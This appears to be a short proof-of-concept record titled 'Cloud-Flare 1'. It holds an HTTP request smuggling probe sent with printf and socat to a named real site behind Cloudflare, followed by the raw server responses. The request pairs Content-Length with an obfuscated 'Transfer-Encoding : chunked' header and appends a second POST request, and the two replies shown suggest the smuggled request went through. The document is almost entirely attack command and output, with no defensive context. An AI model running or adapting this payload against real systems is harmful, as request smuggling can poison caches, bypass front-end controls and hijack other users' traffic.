# Cloud-Flare 1


### Request:

```
cat <(printf "HEAD /en-US HTTP/1.1\r\nHost: easy.ac\r\nAccept-Encoding: gzip, deflate\r\nAccept: */*\r\nAccept-Language: en-US;q=0.9,en;q=0.8\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36\r\nCache-Control: max-age=0\r\nContent-Length: 5\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nPOST /en-US HTTP/1.1\r\nHost: easy.ac") - | socat - SSL:easy.ac:443
```

### Response

```
2024/07/11 20:24:51 socat[2271] W OpenSSL: Warning: this implementation does not check CRLs
HTTP/1.1 200 OK
Date: Thu, 11 Jul 2024 14:54:52 GMT
Content-Type: text/html; charset=utf-8
Connection: keep-alive
Vary: RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Url, Accept-Encoding
x-nextjs-cache: HIT
Cache-Control: s-maxage=31536000, stale-while-revalidate
CF-Cache-Status: DYNAMIC
Set-Cookie: __cf_bm=_vfyTzBVdUPvbPWusVMsRG5vzhCoKVVEZu3EGwgN4_8-1720709692-1.0.1.1-sIUfyr7Z74Hnhw_dkzhrJuYwnxmk6xCcZZgACHIxUbpn1Lx34VfOmQnpIilABIdJvjMt8BstnGuX0EcGvWZPMQ; path=/; expires=Thu, 11-Jul-24 15:24:52 GMT; domain=.easy.ac; HttpOnly; Secure; SameSite=None
Server: cloudflare
CF-RAY: 8a19a19739678030-MAA
Content-Encoding: gzip
alt-svc: h3=":443"; ma=86400



HTTP/1.1 405 Method Not Allowed
Date: Thu, 11 Jul 2024 14:55:06 GMT
Content-Type: text/html; charset=utf-8
Transfer-Encoding: chunked
Connection: keep-alive
Allow: GET
Allow: HEAD
Cache-Control: no-cache, no-store, max-age=0, must-revalidate
Vary: Accept-Encoding
CF-Cache-Status: DYNAMIC
Set-Cookie: __cf_bm=yzsrD.wxJgVptOmLib3TFk5JAcOkTRt9tNF82WjED0E-1720709706-1.0.1.1-oTXZMcn3eDsVK1aREgvx5i5wSuKwoxNtaZ8waT2dL3.OPZ3gg9.2j8ro4WwwIWdqwv7X7LXLyDBAbN922iMHnw; path=/; expires=Thu, 11-Jul-24 15:25:06 GMT; domain=.easy.ac; HttpOnly; Secure
Server: cloudflare
CF-RAY: 8a19a198f99c8030-MAA
alt-svc: h3=":443"; ma=86400

b7b
<!DOCTYPE html><html><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width"/><title>405: Method Not Allowed</title><meta name="next-head-count" content="3"/><noscript data-n-css=""></noscript><script defer="" nomodule="" src="/_next/static/chunks/polyfills-c67a75d1b6f99dc8.js"></script><script src="/_next/static/chunks/webpack-e7a2688ad075ed3c.js" defer=""></script><script src="/_next/static/chunks/framework-71a1fb7dc095dcbd.js" defer=""></script><script src="/_next/static/chunks/main-c3a922d2588945c8.js" defer=""></script><script src="/_next/static/chunks/pages/_app-5a18bc3d44ac29dc.js" defer=""></script><script src="/_next/static/chunks/pages/_error-109ed95c4939c292.js" defer=""></script><script src="/_next/static/2Qro90QRU9E6EnO9GRd1Z/_buildManifest.js" defer=""></script><script src="/_next/static/2Qro90QRU9E6EnO9GRd1Z/_ssgManifest.js" defer=""></script></head><body><div id="__next"><div style="font-family:system-ui,&quot;Segoe UI&quot;,Roboto,Helvetica,Arial,sans-serif,&quot;Apple Color Emoji&quot;,&quot;Segoe UI Emoji&quot;;height:100vh;text-align:center;display:flex;flex-direction:column;align-items:center;justify-content:center"><div style="line-height:48px"><style>body{color:#000;background:#fff;margin:0}.next-error-h1{border-right:1px solid rgba(0,0,0,.3)}@media (prefers-color-scheme:dark){body{color:#fff;background:#000}.next-error-h1{border-right:1px solid rgba(255,255,255,.3)}}</style><h1 class="next-error-h1" style="display:inline-block;margin:0 20px 0 0;padding-right:23px;font-size:24px;font-weight:500;vertical-align:top">405</h1><div style="display:inline-block"><h2 style="font-size:14px;font-weight:400;line-height:28px">Method Not Allowed<!-- -->.</h2></div></div></div></div><script id="__NEXT_DATA__" type="application/json">{"props":{"pageProps":{"statusCode":405}},"page":"/_error","query":{},"buildId":"2Qro90QRU9E6EnO9GRd1Z","isFallback":false,"isExperimentalCompile":false,"gip":true,"scriptLoader":[]}</script><script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'8a19a198f99c8030',t:'MTcyMDcwOTcwNi4wMDAwMDA='};var a=document.createElement('script');a.nonce='';a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script></body></html>
0





```
